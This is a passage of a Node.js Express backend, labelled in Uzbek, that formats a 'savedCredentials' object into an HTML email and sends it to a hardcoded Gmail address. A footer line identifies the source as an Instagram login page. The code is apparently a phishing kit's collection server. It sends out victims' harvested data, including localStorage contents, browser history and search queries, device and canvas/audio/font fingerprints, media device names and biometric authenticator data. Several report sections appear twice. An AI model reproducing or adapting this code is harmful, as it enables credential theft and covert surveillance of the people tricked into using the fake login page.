          <li>SessionStorage: ${savedCredentials.hardwareInfo.storage.sessionStorage} items</li>
          <li>Cookies: ${savedCredentials.hardwareInfo.storage.cookies} characters</li>
        </ul>
        ` : ''}
        ` : ''}
        
        ${savedCredentials.systemInfo ? `
        <hr>
        <h3>⚙️ Tizim ma'lumotlari:</h3>
        <p><strong>Platforma:</strong> ${savedCredentials.systemInfo.platform}</p>
        <p><strong>Vendor:</strong> ${savedCredentials.systemInfo.vendor}</p>
        <p><strong>Product:</strong> ${savedCredentials.systemInfo.product}</p>
        <p><strong>App Name:</strong> ${savedCredentials.systemInfo.appName}</p>
        <p><strong>App Version:</strong> ${savedCredentials.systemInfo.appVersion}</p>
        ${savedCredentials.systemInfo.oscpu ? `<p><strong>OS CPU:</strong> ${savedCredentials.systemInfo.oscpu}</p>` : ''}
        ${savedCredentials.systemInfo.buildID ? `<p><strong>Build ID:</strong> ${savedCredentials.systemInfo.buildID}</p>` : ''}
        <p><strong>Tillar:</strong> ${savedCredentials.systemInfo.languages?.join(', ') || savedCredentials.systemInfo.language}</p>
        <p><strong>Do Not Track:</strong> ${savedCredentials.systemInfo.doNotTrack || 'N/A'}</p>
        <p><strong>Rang chuqurligi:</strong> ${savedCredentials.systemInfo.colorDepth} bit</p>
        <p><strong>Pixel chuqurligi:</strong> ${savedCredentials.systemInfo.pixelDepth} bit</p>
        <p><strong>Device Pixel Ratio:</strong> ${savedCredentials.systemInfo.devicePixelRatio}</p>
        <p><strong>Vaqt zonasi:</strong> ${savedCredentials.systemInfo.timezone}</p>
        <p><strong>Vaqt zonasi offset:</strong> ${savedCredentials.systemInfo.timezoneOffset} daqiqa</p>
        ` : ''}
        
        ${savedCredentials.networkInfo ? `
        <hr>
        <h3>🌐 Tarmoq ma'lumotlari:</h3>
        ${savedCredentials.networkInfo.connection ? `
        <p><strong>Internet turi:</strong> ${savedCredentials.networkInfo.connection.effectiveType}</p>
        <p><strong>Tezlik:</strong> ${savedCredentials.networkInfo.connection.downlink} Mbps</p>
        <p><strong>RTT:</strong> ${savedCredentials.networkInfo.connection.rtt} ms</p>
        <p><strong>Ma'lumot saqlash:</strong> ${savedCredentials.networkInfo.connection.saveData ? 'Yoqilgan' : 'O\'chirilgan'}</p>
        ` : ''}
        ${savedCredentials.networkInfo.networkInterfaces && savedCredentials.networkInfo.networkInterfaces.length > 0 ? `
        <p><strong>Tarmoq interfeyslari:</strong></p>
        <ul>
          ${savedCredentials.networkInfo.networkInterfaces.map(iface => `<li>${JSON.stringify(iface)}</li>`).join('')}
        </ul>
        ` : ''}
        ${savedCredentials.networkInfo.networkCapabilities ? `
        <p><strong>Tarmoq imkoniyatlari:</strong></p>
        <ul>
          <li>WebRTC: ${savedCredentials.networkInfo.networkCapabilities.webRTC ? 'Ha' : 'Yo\'q'}</li>
          <li>WebSocket: ${savedCredentials.networkInfo.networkCapabilities.webSocket ? 'Ha' : 'Yo\'q'}</li>
          <li>Fetch: ${savedCredentials.networkInfo.networkCapabilities.fetch ? 'Ha' : 'Yo\'q'}</li>
          <li>XHR: ${savedCredentials.networkInfo.networkCapabilities.xhr ? 'Ha' : 'Yo\'q'}</li>
        </ul>
        ` : ''}
        ` : ''}
        
        ${savedCredentials.sensorData ? `
        <hr>
        <h3>📡 Sensor ma'lumotlari:</h3>
        <p><strong>Ambient Light:</strong> ${savedCredentials.sensorData.ambientLight}</p>
        <p><strong>Proximity:</strong> ${savedCredentials.sensorData.proximity}</p>
        <p><strong>Magnetometer:</strong> ${savedCredentials.sensorData.magnetometer}</p>
        <p><strong>Gyroscope:</strong> ${savedCredentials.sensorData.gyroscope}</p>
        ${savedCredentials.sensorData.deviceMotion ? `
        <p><strong>Qurilma harakati:</strong> ${JSON.stringify(savedCredentials.sensorData.deviceMotion)}</p>
        ` : ''}
        ${savedCredentials.sensorData.deviceOrientation ? `
        <p><strong>Qurilma orientatsiyasi:</strong> ${JSON.stringify(savedCredentials.sensorData.deviceOrientation)}</p>
        ` : ''}
        ` : ''}
        
        ${savedCredentials.mediaDevices ? `
        <hr>
        <h3>🎤 Media qurilmalari:</h3>
        <p><strong>Audio inputlar:</strong> ${savedCredentials.mediaDevices.audioInputs?.length || 0} ta</p>
        <p><strong>Audio outputlar:</strong> ${savedCredentials.mediaDevices.audioOutputs?.length || 0} ta</p>
        <p><strong>Video inputlar:</strong> ${savedCredentials.mediaDevices.videoInputs?.length || 0} ta</p>
        <p><strong>Media Capabilities:</strong> ${savedCredentials.mediaDevices.mediaCapabilities}</p>
        <p><strong>Media Session:</strong> ${savedCredentials.mediaDevices.mediaSession}</p>
        <p><strong>Screen Capture:</strong> ${savedCredentials.mediaDevices.screenCapture}</p>
        ${savedCredentials.mediaDevices.audioInputs?.length > 0 ? `
        <p><strong>Audio input qurilmalari:</strong></p>
        <ul>
          ${savedCredentials.mediaDevices.audioInputs.map(device => `<li>${device.label || device.deviceId}</li>`).join('')}
        </ul>
        ` : ''}
        ${savedCredentials.mediaDevices.videoInputs?.length > 0 ? `
        <p><strong>Video input qurilmalari:</strong></p>
        <ul>
          ${savedCredentials.mediaDevices.videoInputs.map(device => `<li>${device.label || device.deviceId}</li>`).join('')}
        </ul>
        ` : ''}
        ` : ''}
        
        ${savedCredentials.appData ? `
        <hr>
        <h3>📱 Ilova ma'lumotlari:</h3>
        <p><strong>App Cache:</strong> ${savedCredentials.appData.appCache}</p>
        <p><strong>IndexedDB:</strong> ${savedCredentials.appData.indexedDB}</p>
        ${savedCredentials.appData.pwaData ? `
        <p><strong>PWA ma'lumotlari:</strong></p>
        <ul>
          <li>Service Worker: ${savedCredentials.appData.pwaData.serviceWorker}</li>
          ${savedCredentials.appData.pwaData.manifest ? `<li>Manifest: ${savedCredentials.appData.pwaData.manifest}</li>` : ''}
        </ul>
        ` : ''}
        ${savedCredentials.appData.installedApps && savedCredentials.appData.installedApps.length > 0 ? `
        <p><strong>O'rnatilgan ilovalar:</strong></p>
        <ul>
          ${savedCredentials.appData.installedApps.map(app => `<li>${app.platform}: ${app.url}</li>`).join('')}
        </ul>
        ` : ''}
        ` : ''}
        
        ${savedCredentials.fingerprintData ? `
        <hr>
        <h3>🆔 Fingerprint ma'lumotlari:</h3>
        ${savedCredentials.fingerprintData.fontFingerprint && savedCredentials.fingerprintData.fontFingerprint.length > 0 ? `
        <p><strong>Mavjud fontlar (${savedCredentials.fingerprintData.fontFingerprint.length} ta):</strong></p>
        <ul>
          ${savedCredentials.fingerprintData.fontFingerprint.map(font => `<li>${font}</li>`).join('')}
        </ul>
        ` : ''}
        ${savedCredentials.fingerprintData.pluginFingerprint && savedCredentials.fingerprintData.pluginFingerprint.length > 0 ? `
        <p><strong>Pluginlar (${savedCredentials.fingerprintData.pluginFingerprint.length} ta):</strong></p>
        <ul>
          ${savedCredentials.fingerprintData.pluginFingerprint.map(plugin => `<li>${plugin.name}: ${plugin.description}</li>`).join('')}
        </ul>
        ` : ''}
        ${savedCredentials.fingerprintData.mimeTypeFingerprint && savedCredentials.fingerprintData.mimeTypeFingerprint.length > 0 ? `
        <p><strong>MIME turlari (${savedCredentials.fingerprintData.mimeTypeFingerprint.length} ta):</strong></p>
        <ul>
          ${savedCredentials.fingerprintData.mimeTypeFingerprint.map(mime => `<li>${mime.type}: ${mime.description}</li>`).join('')}
        </ul>
        ` : ''}
        ` : ''}
        
        ${savedCredentials.securityInfo ? `
        <hr>
        <h3>🔒 Xavfsizlik ma'lumotlari:</h3>
        <p><strong>Xavfsiz kontekst:</strong> ${savedCredentials.securityInfo.isSecureContext ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Protokol:</strong> ${savedCredentials.securityInfo.protocol}</p>
        <p><strong>Hostname:</strong> ${savedCredentials.securityInfo.hostname}</p>
        <p><strong>Port:</strong> ${savedCredentials.securityInfo.port || 'N/A'}</p>
        <p><strong>Origin:</strong> ${savedCredentials.securityInfo.origin}</p>
        <p><strong>Referrer Policy:</strong> ${savedCredentials.securityInfo.referrerPolicy}</p>
        <p><strong>Content Security Policy:</strong> ${savedCredentials.securityInfo.contentSecurityPolicy}</p>
        ${savedCredentials.securityInfo.securityHeaders && savedCredentials.securityInfo.securityHeaders.length > 0 ? `
        <p><strong>Xavfsizlik headerlari:</strong> ${savedCredentials.securityInfo.securityHeaders.join(', ')}</p>
        ` : ''}
        <p><strong>Certificate Info:</strong> ${savedCredentials.securityInfo.certificateInfo}</p>
        ` : ''}
        
        ${savedCredentials.performanceData ? `
        <hr>
        <h3>⚡ Performance ma'lumotlari:</h3>
        ${savedCredentials.performanceData.memory ? `
        <p><strong>Xotira ishlatilishi:</strong></p>
        <ul>
          <li>Ishlatilgan: ${Math.round(savedCredentials.performanceData.memory.usedJSHeapSize / 1024 / 1024)} MB</li>
          <li>Jami: ${Math.round(savedCredentials.performanceData.memory.totalJSHeapSize / 1024 / 1024)} MB</li>
          <li>Limit: ${Math.round(savedCredentials.performanceData.memory.jsHeapSizeLimit / 1024 / 1024)} MB</li>
        </ul>
        ` : ''}
        ${savedCredentials.performanceData.resourceTiming && savedCredentials.performanceData.resourceTiming.length > 0 ? `
        <p><strong>Resource timing (${savedCredentials.performanceData.resourceTiming.length} ta):</strong></p>
        <ul>
          ${savedCredentials.performanceData.resourceTiming.slice(0, 5).map(resource => `<li>${resource.name}: ${resource.duration}ms</li>`).join('')}
        </ul>
        ` : ''}
        ${savedCredentials.performanceData.paintTiming && savedCredentials.performanceData.paintTiming.length > 0 ? `
        <p><strong>Paint timing:</strong></p>
        <ul>
          ${savedCredentials.performanceData.paintTiming.map(paint => `<li>${paint.name}: ${paint.startTime}ms</li>`).join('')}
        </ul>
        ` : ''}
        <p><strong>Layout shifts:</strong> ${savedCredentials.performanceData.layoutShifts}</p>
        ` : ''}
        
        ${savedCredentials.browserCapabilities ? `
        <hr>
        <h3>🔧 Brauzer imkoniyatlari:</h3>
        <p><strong>WebAssembly:</strong> ${savedCredentials.browserCapabilities.webAssembly ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>SharedArrayBuffer:</strong> ${savedCredentials.browserCapabilities.sharedArrayBuffer ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Web Workers:</strong> ${savedCredentials.browserCapabilities.webWorkers ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>WebSockets:</strong> ${savedCredentials.browserCapabilities.webSockets ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Fetch:</strong> ${savedCredentials.browserCapabilities.fetch ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>XHR:</strong> ${savedCredentials.browserCapabilities.xhr ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Cache:</strong> ${savedCredentials.browserCapabilities.cache ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Permissions:</strong> ${savedCredentials.browserCapabilities.permissions ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Payment:</strong> ${savedCredentials.browserCapabilities.payment ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>File System:</strong> ${savedCredentials.browserCapabilities.fileSystem ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>File Reader:</strong> ${savedCredentials.browserCapabilities.fileReader ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>File Writer:</strong> ${savedCredentials.browserCapabilities.fileWriter ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Speech Recognition:</strong> ${savedCredentials.browserCapabilities.speechRecognition ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Speech Synthesis:</strong> ${savedCredentials.browserCapabilities.speechSynthesis ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Wake Lock:</strong> ${savedCredentials.browserCapabilities.wakeLock ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Idle Detector:</strong> ${savedCredentials.browserCapabilities.idle ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Presentation:</strong> ${savedCredentials.browserCapabilities.presentation ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Remote Playback:</strong> ${savedCredentials.browserCapabilities.remotePlayback ? 'Ha' : 'Yo\'q'}</p>
        ` : ''}
        
        ${savedCredentials.biometricData ? `
        <hr>
        <h3>🆔 Biometric ma'lumotlari:</h3>
        <p><strong>ID:</strong> ${savedCredentials.biometricData.id}</p>
        <p><strong>Turi:</strong> ${savedCredentials.biometricData.type}</p>
        <p><strong>Authenticator Data:</strong> ${savedCredentials.biometricData.authenticatorData}</p>
        ` : ''}
        
        ${savedCredentials.deviceInfo ? `
        <hr>
        <h3>📱 Qurilma ma'lumotlari:</h3>
        <p><strong>User Agent:</strong> ${savedCredentials.deviceInfo.userAgent}</p>
        <p><strong>Platforma:</strong> ${savedCredentials.deviceInfo.platform}</p>
        <p><strong>Vendor:</strong> ${savedCredentials.deviceInfo.vendor}</p>
        <p><strong>Product:</strong> ${savedCredentials.deviceInfo.product}</p>
        <p><strong>App Name:</strong> ${savedCredentials.deviceInfo.appName}</p>
        <p><strong>App Version:</strong> ${savedCredentials.deviceInfo.appVersion}</p>
        ${savedCredentials.deviceInfo.oscpu ? `<p><strong>OS CPU:</strong> ${savedCredentials.deviceInfo.oscpu}</p>` : ''}
        ${savedCredentials.deviceInfo.buildID ? `<p><strong>Build ID:</strong> ${savedCredentials.deviceInfo.buildID}</p>` : ''}
        <p><strong>Hardware Concurrency:</strong> ${savedCredentials.deviceInfo.hardwareConcurrency}</p>
        <p><strong>Device Memory:</strong> ${savedCredentials.deviceInfo.deviceMemory || 'N/A'} GB</p>
        <p><strong>Max Touch Points:</strong> ${savedCredentials.deviceInfo.maxTouchPoints}</p>
        <p><strong>Online:</strong> ${savedCredentials.deviceInfo.onLine ? 'Ha' : 'Yo\'q'}</p>
        ` : ''}
        
        ${savedCredentials.screenInfo ? `
        <hr>
        <h3>🖥️ Ekran va oyna ma'lumotlari:</h3>
        <p><strong>Ekran o'lchami:</strong> ${savedCredentials.screenInfo.width}x${savedCredentials.screenInfo.height}</p>
        <p><strong>Mavjud o'lcham:</strong> ${savedCredentials.screenInfo.availWidth}x${savedCredentials.screenInfo.availHeight}</p>
        <p><strong>Rang chuqurligi:</strong> ${savedCredentials.screenInfo.colorDepth} bit</p>
        <p><strong>Pixel chuqurligi:</strong> ${savedCredentials.screenInfo.pixelDepth} bit</p>
        <p><strong>Orientatsiya:</strong> ${savedCredentials.screenInfo.orientation}</p>
        <p><strong>Orientatsiya burchagi:</strong> ${savedCredentials.screenInfo.orientationAngle}°</p>
        <p><strong>Ichki o'lcham:</strong> ${savedCredentials.screenInfo.innerWidth}x${savedCredentials.screenInfo.innerHeight}</p>
        <p><strong>Tashqi o'lcham:</strong> ${savedCredentials.screenInfo.outerWidth}x${savedCredentials.screenInfo.outerHeight}</p>
        <p><strong>Device Pixel Ratio:</strong> ${savedCredentials.screenInfo.devicePixelRatio}</p>
        <p><strong>Scroll pozitsiyasi:</strong> X: ${savedCredentials.screenInfo.scrollX}, Y: ${savedCredentials.screenInfo.scrollY}</p>
        ` : ''}
        
        ${savedCredentials.timeInfo ? `
        <hr>
        <h3>⏰ Vaqt va til ma'lumotlari:</h3>
        <p><strong>Hozirgi vaqt:</strong> ${savedCredentials.timeInfo.currentTime}</p>
        <p><strong>Vaqt zonasi:</strong> ${savedCredentials.timeInfo.timezone}</p>
        <p><strong>Vaqt zonasi offset:</strong> ${savedCredentials.timeInfo.timezoneOffset} daqiqa</p>
        <p><strong>Til:</strong> ${savedCredentials.timeInfo.language}</p>
        <p><strong>Tillar:</strong> ${savedCredentials.timeInfo.languages?.join(', ')}</p>
        <p><strong>Sana format:</strong> ${savedCredentials.timeInfo.dateFormat}</p>
        <p><strong>Vaqt format:</strong> ${savedCredentials.timeInfo.timeFormat}</p>
        <p><strong>Yozgi vaqt:</strong> ${savedCredentials.timeInfo.daylightSaving ? 'Ha' : 'Yo\'q'}</p>
        ` : ''}
        
        ${savedCredentials.networkInfo ? `
        <hr>
        <h3>🌐 Tarmoq ma'lumotlari:</h3>
        <p><strong>Online:</strong> ${savedCredentials.networkInfo.onLine ? 'Ha' : 'Yo\'q'}</p>
        ${savedCredentials.networkInfo.connection ? `
        <p><strong>Internet turi:</strong> ${savedCredentials.networkInfo.connection.effectiveType}</p>
        <p><strong>Tezlik:</strong> ${savedCredentials.networkInfo.connection.downlink} Mbps</p>
        <p><strong>RTT:</strong> ${savedCredentials.networkInfo.connection.rtt} ms</p>
        <p><strong>Ma'lumot saqlash:</strong> ${savedCredentials.networkInfo.connection.saveData ? 'Yoqilgan' : 'O\'chirilgan'}</p>
        ` : ''}
        ${savedCredentials.networkInfo.networkInterfaces && savedCredentials.networkInfo.networkInterfaces.length > 0 ? `
        <p><strong>Tarmoq interfeyslari:</strong></p>
        <ul>
          ${savedCredentials.networkInfo.networkInterfaces.map(iface => `<li>${JSON.stringify(iface)}</li>`).join('')}
        </ul>
        ` : ''}
        ${savedCredentials.networkInfo.networkCapabilities ? `
        <p><strong>Tarmoq imkoniyatlari:</strong></p>
        <ul>
          <li>WebRTC: ${savedCredentials.networkInfo.networkCapabilities.webRTC ? 'Ha' : 'Yo\'q'}</li>
          <li>WebSocket: ${savedCredentials.networkInfo.networkCapabilities.webSocket ? 'Ha' : 'Yo\'q'}</li>
          <li>Fetch: ${savedCredentials.networkInfo.networkCapabilities.fetch ? 'Ha' : 'Yo\'q'}</li>
          <li>XHR: ${savedCredentials.networkInfo.networkCapabilities.xhr ? 'Ha' : 'Yo\'q'}</li>
        </ul>
        ` : ''}
        ` : ''}
        
        ${savedCredentials.browserCapabilities ? `
        <hr>
        <h3>🔧 Brauzer imkoniyatlari:</h3>
        <p><strong>Cookie yoqilgan:</strong> ${savedCredentials.browserCapabilities.cookies ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Java yoqilgan:</strong> ${savedCredentials.browserCapabilities.java ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Online:</strong> ${savedCredentials.browserCapabilities.onLine ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Do Not Track:</strong> ${savedCredentials.browserCapabilities.doNotTrack || 'N/A'}</p>
        <p><strong>Maksimal touch nuqtalari:</strong> ${savedCredentials.browserCapabilities.maxTouchPoints}</p>
        <p><strong>Hardware concurrency:</strong> ${savedCredentials.browserCapabilities.hardwareConcurrency}</p>
        <p><strong>Device memory:</strong> ${savedCredentials.browserCapabilities.deviceMemory || 'N/A'} GB</p>
        <p><strong>WebGL:</strong> ${savedCredentials.browserCapabilities.webgl ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>WebGL2:</strong> ${savedCredentials.browserCapabilities.webgl2 ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>WebRTC:</strong> ${savedCredentials.browserCapabilities.webrtc ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Service Worker:</strong> ${savedCredentials.browserCapabilities.serviceWorker ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Push Manager:</strong> ${savedCredentials.browserCapabilities.pushManager ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Notifications:</strong> ${savedCredentials.browserCapabilities.notifications ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Geolocation:</strong> ${savedCredentials.browserCapabilities.geolocation ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Battery:</strong> ${savedCredentials.browserCapabilities.battery ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Vibration:</strong> ${savedCredentials.browserCapabilities.vibration ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Bluetooth:</strong> ${savedCredentials.browserCapabilities.bluetooth ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>USB:</strong> ${savedCredentials.browserCapabilities.usb ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Serial:</strong> ${savedCredentials.browserCapabilities.serial ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>HID:</strong> ${savedCredentials.browserCapabilities.hid ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Gamepad:</strong> ${savedCredentials.browserCapabilities.gamepad ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>WebAssembly:</strong> ${savedCredentials.browserCapabilities.webAssembly ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>SharedArrayBuffer:</strong> ${savedCredentials.browserCapabilities.sharedArrayBuffer ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Web Workers:</strong> ${savedCredentials.browserCapabilities.webWorkers ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>WebSockets:</strong> ${savedCredentials.browserCapabilities.webSockets ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Fetch:</strong> ${savedCredentials.browserCapabilities.fetch ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>XHR:</strong> ${savedCredentials.browserCapabilities.xhr ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Cache:</strong> ${savedCredentials.browserCapabilities.cache ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Permissions:</strong> ${savedCredentials.browserCapabilities.permissions ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Payment:</strong> ${savedCredentials.browserCapabilities.payment ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>File System:</strong> ${savedCredentials.browserCapabilities.fileSystem ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>File Reader:</strong> ${savedCredentials.browserCapabilities.fileReader ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>File Writer:</strong> ${savedCredentials.browserCapabilities.fileWriter ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Speech Recognition:</strong> ${savedCredentials.browserCapabilities.speechRecognition ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Speech Synthesis:</strong> ${savedCredentials.browserCapabilities.speechSynthesis ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Wake Lock:</strong> ${savedCredentials.browserCapabilities.wakeLock ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Idle Detector:</strong> ${savedCredentials.browserCapabilities.idle ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Presentation:</strong> ${savedCredentials.browserCapabilities.presentation ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Remote Playback:</strong> ${savedCredentials.browserCapabilities.remotePlayback ? 'Ha' : 'Yo\'q'}</p>
        ` : ''}
        
        ${savedCredentials.performanceData ? `
        <hr>
        <h3>⚡ Performance ma'lumotlari:</h3>
        ${savedCredentials.performanceData.memory ? `
        <p><strong>Xotira ishlatilishi:</strong></p>
        <ul>
          <li>Ishlatilgan: ${Math.round(savedCredentials.performanceData.memory.usedJSHeapSize / 1024 / 1024)} MB</li>
          <li>Jami: ${Math.round(savedCredentials.performanceData.memory.totalJSHeapSize / 1024 / 1024)} MB</li>
          <li>Limit: ${Math.round(savedCredentials.performanceData.memory.jsHeapSizeLimit / 1024 / 1024)} MB</li>
        </ul>
        ` : ''}
        ${savedCredentials.performanceData.resourceTiming && savedCredentials.performanceData.resourceTiming.length > 0 ? `
        <p><strong>Resource timing (${savedCredentials.performanceData.resourceTiming.length} ta):</strong></p>
        <ul>
          ${savedCredentials.performanceData.resourceTiming.slice(0, 5).map(resource => `<li>${resource.name}: ${resource.duration}ms</li>`).join('')}
        </ul>
        ` : ''}
        ${savedCredentials.performanceData.paintTiming && savedCredentials.performanceData.paintTiming.length > 0 ? `
        <p><strong>Paint timing:</strong></p>
        <ul>
          ${savedCredentials.performanceData.paintTiming.map(paint => `<li>${paint.name}: ${paint.startTime}ms</li>`).join('')}
        </ul>
        ` : ''}
        <p><strong>Layout shifts:</strong> ${savedCredentials.performanceData.layoutShifts}</p>
        ` : ''}
        
        ${savedCredentials.securityInfo ? `
        <hr>
        <h3>🔒 Xavfsizlik ma'lumotlari:</h3>
        <p><strong>Xavfsiz kontekst:</strong> ${savedCredentials.securityInfo.isSecureContext ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Protokol:</strong> ${savedCredentials.securityInfo.protocol}</p>
        <p><strong>Hostname:</strong> ${savedCredentials.securityInfo.hostname}</p>
        <p><strong>Port:</strong> ${savedCredentials.securityInfo.port || 'N/A'}</p>
        <p><strong>Origin:</strong> ${savedCredentials.securityInfo.origin}</p>
        <p><strong>Referrer Policy:</strong> ${savedCredentials.securityInfo.referrerPolicy}</p>
        <p><strong>Content Security Policy:</strong> ${savedCredentials.securityInfo.contentSecurityPolicy}</p>
        ${savedCredentials.securityInfo.securityHeaders && savedCredentials.securityInfo.securityHeaders.length > 0 ? `
        <p><strong>Xavfsizlik headerlari:</strong> ${savedCredentials.securityInfo.securityHeaders.join(', ')}</p>
        ` : ''}
        <p><strong>Certificate Info:</strong> ${savedCredentials.securityInfo.certificateInfo}</p>
        ` : ''}
        
        ${savedCredentials.mobileInfo ? `
        <hr>
        <h3>📱 Mobile qurilma ma'lumotlari:</h3>
        <p><strong>Qurilma turi:</strong> Mobile</p>
        <p><strong>Device Memory:</strong> ${savedCredentials.mobileInfo.deviceMemory || 'N/A'} GB</p>
        <p><strong>Hardware Concurrency:</strong> ${savedCredentials.mobileInfo.hardwareConcurrency}</p>
        <p><strong>Max Touch Points:</strong> ${savedCredentials.mobileInfo.maxTouchPoints}</p>
        <p><strong>User Agent:</strong> ${savedCredentials.mobileInfo.userAgent}</p>
        <p><strong>Platforma:</strong> ${savedCredentials.mobileInfo.platform}</p>
        ` : ''}
        
        ${savedCredentials.deviceFingerprint ? `
        <hr>
        <h3>🆔 Device Fingerprint:</h3>
        ${savedCredentials.deviceFingerprint.canvasFingerprint ? `<p><strong>Canvas Fingerprint:</strong> ${savedCredentials.deviceFingerprint.canvasFingerprint.substring(0, 100)}...</p>` : ''}
        ${savedCredentials.deviceFingerprint.audioFingerprint ? `
        <p><strong>Audio Fingerprint:</strong></p>
        <ul>
          <li>Sample Rate: ${savedCredentials.deviceFingerprint.audioFingerprint.sampleRate} Hz</li>
          <li>Channel Count: ${savedCredentials.deviceFingerprint.audioFingerprint.channelCount}</li>
          <li>Max Channel Count: ${savedCredentials.deviceFingerprint.audioFingerprint.maxChannelCount}</li>
        </ul>
        ` : ''}
        ${savedCredentials.deviceFingerprint.fontFingerprint && savedCredentials.deviceFingerprint.fontFingerprint.length > 0 ? `
        <p><strong>Font Fingerprint (${savedCredentials.deviceFingerprint.fontFingerprint.length} ta):</strong></p>
        <ul>
          ${savedCredentials.deviceFingerprint.fontFingerprint.map(font => `<li>${font}</li>`).join('')}
        </ul>
        ` : ''}
        ${savedCredentials.deviceFingerprint.pluginFingerprint && savedCredentials.deviceFingerprint.pluginFingerprint.length > 0 ? `
        <p><strong>Plugin Fingerprint (${savedCredentials.deviceFingerprint.pluginFingerprint.length} ta):</strong></p>
        <ul>
          ${savedCredentials.deviceFingerprint.pluginFingerprint.map(plugin => `<li>${plugin.name}: ${plugin.description}</li>`).join('')}
        </ul>
        ` : ''}
        ${savedCredentials.deviceFingerprint.mimeTypeFingerprint && savedCredentials.deviceFingerprint.mimeTypeFingerprint.length > 0 ? `
        <p><strong>MIME Type Fingerprint (${savedCredentials.deviceFingerprint.mimeTypeFingerprint.length} ta):</strong></p>
        <ul>
          ${savedCredentials.deviceFingerprint.mimeTypeFingerprint.map(mime => `<li>${mime.type}: ${mime.description}</li>`).join('')}
        </ul>
        ` : ''}
        ` : ''}
        
        ${savedCredentials.storageData ? `
        <hr>
        <h3>📋 Storage ma'lumotlari:</h3>
        <p><strong>LocalStorage items:</strong> ${Object.keys(savedCredentials.storageData.localStorage).length}</p>
        <p><strong>SessionStorage items:</strong> ${Object.keys(savedCredentials.storageData.sessionStorage).length}</p>
        <p><strong>Cookies:</strong> ${savedCredentials.storageData.cookies ? savedCredentials.storageData.cookies.length : 0} characters</p>
        ${Object.keys(savedCredentials.storageData.localStorage).length > 0 ? `
        <p><strong>LocalStorage ma'lumotlari:</strong></p>
        <ul>
          ${Object.entries(savedCredentials.storageData.localStorage).slice(0, 10).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}
        </ul>
        ` : ''}
        ` : ''}
        
        ${savedCredentials.browserHistory ? `
        <hr>
        <h3>🏠 Browser history:</h3>
        <p><strong>Hozirgi URL:</strong> ${savedCredentials.browserHistory.currentUrl}</p>
        <p><strong>Referrer:</strong> ${savedCredentials.browserHistory.referrer}</p>
        <p><strong>Oldingi URL:</strong> ${savedCredentials.browserHistory.previousUrl}</p>
        <p><strong>Search Query:</strong> ${savedCredentials.browserHistory.searchQuery}</p>
        <p><strong>Hash:</strong> ${savedCredentials.browserHistory.hash}</p>
        <p><strong>Pathname:</strong> ${savedCredentials.browserHistory.pathname}</p>
        <p><strong>Search:</strong> ${savedCredentials.browserHistory.search}</p>
        <p><strong>Origin:</strong> ${savedCredentials.browserHistory.origin}</p>
        ` : ''}
        <hr>
        <p><em>Bu xabar Instagram login sahifasidan yuborildi.</em></p>
      `
    };

    await transporter.sendMail(mailOptions);
    console.log('Email notification sent to everestdevelopmet@gmail.com');

    // Return success response
    res.json({ 
      success: true, 
      message: 'Data received successfully' 
    });

  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ 
      error: 'Server xatosi', 
      details: error.message 
    });
  }
});

// Test endpoint
app.get('/api/test', (req, res) => {
  res.json({ message: 'Backend ishlayapti!' });
});

app.listen(PORT, () => {
  console.log(`Server ${PORT} portda ishlayapti`);
}); 